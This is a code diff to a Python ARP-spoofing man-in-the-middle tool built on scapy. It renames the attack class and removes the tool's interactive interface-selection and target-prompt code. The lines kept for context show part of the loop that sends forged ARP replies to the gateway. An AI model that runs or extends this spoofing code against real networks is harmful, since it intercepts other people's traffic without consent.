@@ -1,10 +1,9 @@
 import netifaces
-import socket
 import ipaddress
 from scapy.all import ARP, Ether, sendp
 
 
-class MITM:
+class MITMAttack:
     def __init__(self, target_ip, gateway_ip, interface):
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
@@ -45,47 +44,3 @@ class MITM:
                 sendp(arp_response_gateway, iface=self.interface)
         except KeyboardInterrupt:
             print("\nMITM Attack Stopped.")
-
-
-def print_available_interfaces():
-    interfaces = netifaces.interfaces()
-    print("\nAvailable network interfaces:")
-    for i, interface in enumerate(interfaces, start=1):
-        print(f"{i}. {interface}")
-    print()
-
-
-def select_interface():
-    while True:
-        print_available_interfaces()
-        try:
-            choice = int(input("Enter the number of the interface to use: "))
-            if 1 <= choice <= len(interfaces):
-                return interfaces[choice - 1]
-            else:
-                print("Invalid choice. Please select a valid interface.")
-        except ValueError:
-            print("Invalid input. Please enter a number.")
-
-
-if __name__ == "__main__":
-    interfaces = netifaces.interfaces()
-    if not interfaces:
-        print("No network interfaces found.")
-        exit(1)
-
-    print_available_interfaces()
-    interface = select_interface()
-
-    target_ip = input("Enter the target IP address: ")
-    gateway_ip = input("Enter the gateway IP address: ")
-
-    try:
-        target_ip = str(MITM().validate_ip(target_ip))
-        gateway_ip = str(MITM().validate_ip(gateway_ip))
-    except ValueError as e:
-        print(e)
-        exit(1)
-
-    mitm = MITM(target_ip=target_ip, gateway_ip=gateway_ip, interface=interface)
-    mitm.run_attack()
